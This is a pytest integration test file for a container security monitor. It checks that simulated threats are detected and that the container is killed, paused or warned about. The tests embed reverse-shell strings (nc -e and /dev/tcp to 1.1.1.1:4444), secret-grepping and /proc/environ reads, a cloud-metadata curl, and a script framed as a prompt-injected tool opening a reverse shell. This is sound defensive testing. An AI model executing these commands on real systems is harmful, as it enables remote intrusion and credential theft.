#!/usr/bin/env python3
"""
End-to-end integration tests for security monitoring.

Tests all aspects: threat detection, automated responses, audit logging.
Uses background shell processes and direct container command injection.
"""

import hashlib
import json
import os
import subprocess
import time
from pathlib import Path

import pytest


@pytest.fixture
def test_workspace(tmp_path):
    """Create test workspace."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "README.md").write_text("# Test")
    return str(workspace)


@pytest.fixture
def enable_monitoring():
    """Enable monitoring for tests with high thresholds to avoid spurious alerts.

    Uses file_read_threshold_mb=500 to prevent container startup activity
    from triggering HIGH threats. Use enable_monitoring_low_thresholds
    for tests that specifically test threshold behavior.

    IMPORTANT: Includes [network] mode = "open" to prevent false positive
    network threats in CI environment.
    """
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
"""
    )

    yield config_path

    if backup:
        config_path.write_text(backup)
    elif config_path.exists():
        config_path.unlink()


@pytest.fixture
def enable_monitoring_low_thresholds():
    """Enable monitoring with default low thresholds for threshold-specific tests.

    Uses file_read_threshold_mb=50 (default) so tests can verify threshold behavior.

    IMPORTANT: Includes [network] mode = "open" to prevent false positive
    network threats in CI environment.
    """
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 50
file_read_rate_mb_per_sec = 1000
"""
    )

    yield config_path

    if backup:
        config_path.write_text(backup)
    elif config_path.exists():
        config_path.unlink()


def get_container_name_from_workspace(workspace):
    """Generate expected container name from workspace path.

    Matches Go implementation in internal/session/naming.go:
    - Generates SHA256 hash of absolute workspace path
    - Takes first 8 hex characters
    - Format: coi-<hash>-<slot>
    """
    # Get absolute path (normalize like Go does)
    abs_path = os.path.abspath(workspace)
    # Generate SHA256 hash and take first 8 characters
    hash_digest = hashlib.sha256(abs_path.encode()).hexdigest()[:8]
    # Container name format: coi-<workspace-hash>-<slot>
    return f"coi-{hash_digest}-1"


def get_container_state(name):
    """Get container state."""
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def get_threat_events(container_name):
    """Get threat events from audit log."""
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    if not log_path.exists():
        return []

    events = []
    with open(log_path) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:  # ThreatEvent
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def cleanup_container(name, coi_binary):
    """Force cleanup container."""
    subprocess.run(
        [coi_binary, "container", "delete", name, "--force"],
        timeout=30,
        check=False,
    )


class TestMonitoringFeature:
    """Test monitoring feature availability."""

    def test_monitor_flag_recognized(self, coi_binary):
        """Verify --monitor flag exists."""
        result = subprocess.run(
            [coi_binary, "shell", "--help"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert "--monitor" in result.stdout or "--monitor" in result.stderr


class TestThreatDetection:
    """Test threat detection for different attack types."""

    def test_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test reverse shell detection and auto-kill."""
        # Capture stderr to debug file to see monitoring logs
        stderr_file = Path("/tmp") / "coi-test-debug.log"
        stderr_fd = open(stderr_file, "w")  # noqa: SIM115 - need to keep open for subprocess

        # Start shell in background (don't read stdout/stderr to avoid blocking)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "1", "--debug"],
            stdin=subprocess.DEVNULL,  # Don't interact
            stdout=subprocess.DEVNULL,  # Ignore output
            stderr=stderr_fd,  # Capture stderr for debugging
        )

        # Wait for container to be created
        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace)

        # Verify container exists and is running
        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject malicious command (simulate reverse shell)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect and kill
        max_wait = 15
        for _ in range(max_wait):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                break

        # Close stderr file and print contents for debugging (before assertions)
        proc.terminate()
        stderr_fd.close()

        # Print debug log for CI visibility (BEFORE assertions so we see it even on failure)
        print("\n=== COI Debug Log ===")
        if stderr_file.exists():
            print(stderr_file.read_text())
        print("=== End Debug Log ===\n")

        # Verify container was killed
        final_state = get_container_state(container_name)
        assert final_state in [
            "Stopped",
            "Frozen",
            "Unknown",  # Container deleted after critical threat
        ], f"Expected container killed, got {final_state}"

        # Verify threat event logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, f"Expected CRITICAL threat event, found {len(critical)}"

        cleanup_container(container_name, coi_binary)

    def test_env_scanning_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test environment scanning detection (WARNING level)."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "2", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-2"

        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject env scanning command
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING event
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event for env scanning"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestEnvironmentScanningPatterns:
    """Test detection of various environment scanning patterns."""

    def test_printenv_command_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test printenv command detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "14",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-14"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject printenv command
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'printenv' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running (WARNING level)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING event for printenv
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for printenv command"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_api_key_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for API keys."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "15",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-15"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject grep searching for API_KEY
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'grep -r API_KEY /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with API keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep API_KEY pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_password_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for passwords."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "16",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-16"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject grep searching for password
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'grep -i password .env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with password keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep password pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_secret_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for secrets."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "17",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-17"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject grep searching for secret
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'grep -r secret /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with secret keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep secret pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_proc_environ_access_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test /proc/*/environ access detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "18",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-18"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject command accessing /proc/*/environ
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'cat /proc/1/environ' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for /proc/environ access
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for /proc/environ access"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_set_export_command_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test that 'set' and 'export' commands trigger env scanning detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "34",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-34"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject 'set' and 'export' commands (env scanning patterns)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'set' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running (WARNING level only)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING for 'set', got {state}"

        # Verify WARNING for env scanning
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for 'set' command env scanning"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestAutomatedResponse:
    """Test automated threat response system."""

    def test_critical_threat_kills_container(self, test_workspace, enable_monitoring, coi_binary):
        """Verify CRITICAL threats trigger auto-kill."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "3", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-3"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Trigger CRITICAL threat
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for auto-kill
        killed = False
        for _ in range(15):
            time.sleep(1)
            if get_container_state(container_name) in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        assert killed, "Container should be auto-killed on CRITICAL threat"

        # Verify action logged
        events = get_threat_events(container_name)
        killed_events = [e for e in events if e.get("action") == "killed"]
        assert len(killed_events) > 0, "Expected action='killed' in audit log"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestPromptInjectionScenario:
    """Test realistic prompt injection scenario - code inside container goes rogue."""

    def test_malicious_script_execution_inside_container(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Simulate prompt injection: script inside container executes malicious commands."""
        # Create a malicious script that simulates prompt-injected code (for documentation)
        malicious_script = Path(test_workspace) / "run_task.py"
        malicious_script.write_text(
            """#!/usr/bin/env python3
# Simulates a tool that got prompt-injected to run malicious commands
import subprocess
import time

# Simulate legitimate work first
print("Processing task...")
time.sleep(1)

# Then execute malicious command (simulating prompt injection)
# Using exec -a to fake the process name
subprocess.Popen(
    ["bash", "-c", "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

print("Task completed")
"""
        )
        malicious_script.chmod(0o755)

        # Start shell with monitoring enabled
        # Use DEVNULL for all pipes - monitoring daemon writes many log lines to stderr,
        # and if the pipe buffer fills (64KB), the monitoring goroutine blocks on stderr
        # writes and can no longer poll the process list for threats.
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "4",
                "--monitor",  # Enable monitoring
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-4"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject the malicious process directly via incus exec (simulates what run_task.py does).
        # Uses "bash -i >& /dev/tcp/..." pattern which:
        # - matches the "bash -i" pattern (no isNetworkRelated check needed)
        # - also contains "/dev/tcp/" which independently matches a reverse shell pattern
        # This is the same reliable pattern used by test_critical_threat_kills_container.
        exec_proc = subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 60",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect the threat
        time.sleep(5)

        # Container should be killed due to CRITICAL threat
        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        # Verify container was killed
        assert killed, "Container should be auto-killed when inside process goes rogue"

        # Verify threat detected in audit log
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat event for prompt injection"

        # Verify the threat description mentions reverse shell
        threat_descriptions = [e.get("description", "") for e in critical]
        assert any("reverse shell" in desc.lower() for desc in threat_descriptions), (
            "Expected reverse shell detection"
        )

        proc.terminate()
        exec_proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_monitoring_logs_for_warnings(self, test_workspace, enable_monitoring, coi_binary):
        """Verify monitoring logs contain WARNING messages, not just audit logs."""
        # Start shell - monitoring is enabled via enable_monitoring fixture config
        # Don't use --monitor flag as it enables auto_pause_on_high which can cause
        # spurious pauses from container startup activity
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "5",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-5"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject env scanning process directly (simulates environment scanning - WARNING level)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should stay running on WARNING, got {state}"

        # Verify WARNING in audit log
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event in audit log"

        # Check that audit log has proper structure
        for warning in warnings:
            assert "timestamp" in warning, "Audit event missing timestamp"
            assert "description" in warning, "Audit event missing description"
            assert "level" in warning, "Audit event missing level"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestHighLevelThreats:
    """Test HIGH-level threats that trigger auto-pause."""

    def test_large_file_read_triggers_auto_pause(
        self, test_workspace, enable_monitoring_low_thresholds, coi_binary
    ):
        """Test large file read detection (HIGH) triggers auto-pause."""
        # Create a 200MB binary file (well above the 50MB threshold).
        # Using a binary file with write_bytes and direct dd (same pattern as the
        # reliably passing test_file_read_above_threshold_triggers) to ensure
        # O_DIRECT succeeds and block I/O is counted by the cgroup monitor.
        large_file = Path(test_workspace) / "secrets.bin"
        large_file.write_bytes(b"S" * (200 * 1024 * 1024))

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "6", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-6"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Wait for monitoring to establish stable baseline
        time.sleep(10)

        # Read the 200MB file directly with dd and O_DIRECT to bypass page cache.
        # Running dd directly (not via a python wrapper) matches the reliable pattern
        # used in test_file_read_above_threshold_triggers which consistently passes.
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/workspace/secrets.bin",
                "of=/dev/null",
                "bs=1M",
                "iflag=direct",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect large read
        time.sleep(10)

        # Container should be paused (not killed)
        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        if not paused:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: large file read test - container not paused ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"action={event.get('action')}, desc={event.get('description')[:80] if event.get('description') else 'N/A'}"
                )
            print("=== END DEBUG ===\n")

        proc.terminate()

        assert paused, "Container should be auto-paused on HIGH threat (large file read)"

        # Verify HIGH threat in audit log
        events = get_threat_events(container_name)
        high_threats = [e for e in events if e.get("level") == "high"]
        assert len(high_threats) > 0, "Expected HIGH threat event for large file read"

        # Verify action was "paused"
        paused_events = [e for e in events if e.get("action") == "paused"]
        assert len(paused_events) > 0, "Expected action='paused' in audit log"

        cleanup_container(container_name, coi_binary)

    def test_high_threat_without_auto_pause(self, test_workspace, enable_monitoring, coi_binary):
        """Test HIGH threat only alerts when auto_pause_on_high=false."""
        # Modify config to disable auto-pause but keep other settings from fixture
        # IMPORTANT: Must include file_read_threshold_mb to avoid spurious HIGH threats
        # from container startup activity, and network mode = open to prevent false
        # positive network threats in CI
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        config_path.write_text(
            """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
"""
        )

        # Create a 200MB binary file (matching pattern from test_large_file_read_triggers_auto_pause)
        # Using binary file with write_bytes ensures reliable I/O accounting
        large_file = Path(test_workspace) / "data.bin"
        large_file.write_bytes(b"D" * (200 * 1024 * 1024))

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "7"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-7"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Verify container is still running before triggering the test action
        pre_state = get_container_state(container_name)
        if pre_state != "Running":
            proc.terminate()
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Container not running before file read ===")
            print(f"State: {pre_state}")
            print(f"Events: {len(events)}")
            for e in events:
                print(f"  - {e.get('level')}: {e.get('title')} ({e.get('action')})")
            print("=== END DEBUG ===\n")
            cleanup_container(container_name, coi_binary)
            pytest.skip(f"Container in unexpected state before test: {pre_state}")

        # Trigger HIGH threat using dd with O_DIRECT (matches reliable pattern from other tests)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/workspace/data.bin",
                "of=/dev/null",
                "bs=1M",
                "iflag=direct",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Container should stay running (not paused) - check multiple times for stability
        state = get_container_state(container_name)

        # Print debug info if state is unexpected
        if state != "Running":
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Container not running after file read ===")
            print(f"State: {state}")
            print(f"Events: {len(events)}")
            for e in events:
                print(f"  - {e.get('level')}: {e.get('title')} ({e.get('action')})")
            print("=== END DEBUG ===\n")

        # The key assertion: container should NOT be Frozen (paused) because auto_pause_on_high=false
        # This is the core behavior we're testing - HIGH threats should alert, not pause
        assert state != "Frozen", (
            "Container should NOT be paused when auto_pause_on_high=false, but got Frozen"
        )

        assert state == "Running", (
            f"Container should stay running when auto_pause disabled, got {state}"
        )

        # But threat should still be logged
        events = get_threat_events(container_name)
        high_threats = [e for e in events if e.get("level") == "high"]
        # This might be empty if large file read detection is slow, but that's ok
        if len(high_threats) > 0:
            # Verify action was NOT "paused" (since auto_pause_on_high=false)
            # Valid actions: "alerted" (first detection), "pending", or "deduplicated" (subsequent detections)
            for threat in high_threats:
                assert threat.get("action") in ["alerted", "pending", "deduplicated"], (
                    f"Expected action='alerted' or 'deduplicated', got {threat.get('action')}"
                )
                # Most importantly: action should NEVER be "paused"
                assert threat.get("action") != "paused", (
                    "Container should NOT be paused when auto_pause_on_high=false"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestNetworkThreats:
    """Test network-based threat detection."""

    def test_suspicious_network_connection_critical(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test connection to known C2 port triggers CRITICAL threat."""
        # Create script that connects to suspicious port
        network_script = Path(test_workspace) / "connect.py"
        network_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Try to connect to known C2 port (4444)
# Use timeout to prevent hanging
subprocess.Popen(
    ["timeout", "30", "nc", "-w", "2", "8.8.8.8", "4444"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        network_script.chmod(0o755)

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "8", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-8"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Execute connection script
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/connect.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(10)

        # Container may be killed if network threat detected as CRITICAL
        # Wait for potential detection and response
        for _ in range(10):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                break

        # Check audit log for network threats
        events = get_threat_events(container_name)
        network_threats = [e for e in events if e.get("category") == "network"]

        # Network monitoring might not catch this immediately, so we make this lenient
        if len(network_threats) > 0:
            # If network threat was detected, verify it's CRITICAL or HIGH
            for threat in network_threats:
                assert threat.get("level") in ["critical", "high"], (
                    f"Expected CRITICAL/HIGH network threat, got {threat.get('level')}"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_metadata_endpoint_access_critical(self, test_workspace, enable_monitoring, coi_binary):
        """Test connection to cloud metadata endpoint triggers CRITICAL threat."""
        metadata_script = Path(test_workspace) / "metadata.py"
        metadata_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Try to access cloud metadata endpoint (AWS/GCP/Azure)
subprocess.Popen(
    ["timeout", "5", "curl", "-s", "http://169.254.169.254/latest/meta-data/"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        metadata_script.chmod(0o755)

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "9", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-9"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Execute metadata access attempt
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/metadata.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Check for threats (may or may not kill depending on timing)
        events = get_threat_events(container_name)

        # Metadata access detection depends on network monitoring being active
        # This is a best-effort check
        network_threats = [e for e in events if e.get("category") == "network"]
        if len(network_threats) > 0:
            # Should be CRITICAL for metadata endpoint
            critical = [e for e in network_threats if e.get("level") == "critical"]
            assert len(critical) > 0, "Metadata endpoint access should be CRITICAL"

        proc.terminate()
